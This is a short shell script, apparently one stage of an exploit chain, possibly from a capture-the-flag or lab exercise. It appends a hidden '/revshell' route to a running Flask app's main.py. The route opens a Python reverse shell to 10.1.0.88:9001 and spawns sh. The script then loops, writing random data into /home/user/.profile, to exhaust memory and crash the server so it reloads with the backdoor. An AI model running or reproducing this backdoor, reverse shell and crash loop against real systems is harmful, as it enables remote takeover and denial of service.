export REVSHELL_HOST="10.1.0.88"
export REVSHELL_PORT=9001

# Add revshell route:
deno run --allow-all ./appendFile.ts '/proc/self/cwd/main.py' '@app.route(\"/revshell\")\ndef revshell():\n    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"'"$REVSHELL_HOST"'\",'"$REVSHELL_PORT"'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")\n    return \"revshell started\"'

# Crash the server by oom

echo "Crashing server to force a reload. This might take 5 minutes or so..."

while deno run --allow-all ./appendRandomFile.ts '/home/user/.profile' ; do
    echo "Still not crashed"
done

echo "Crashed server successfully. Try opening a revshell with revshell.sh"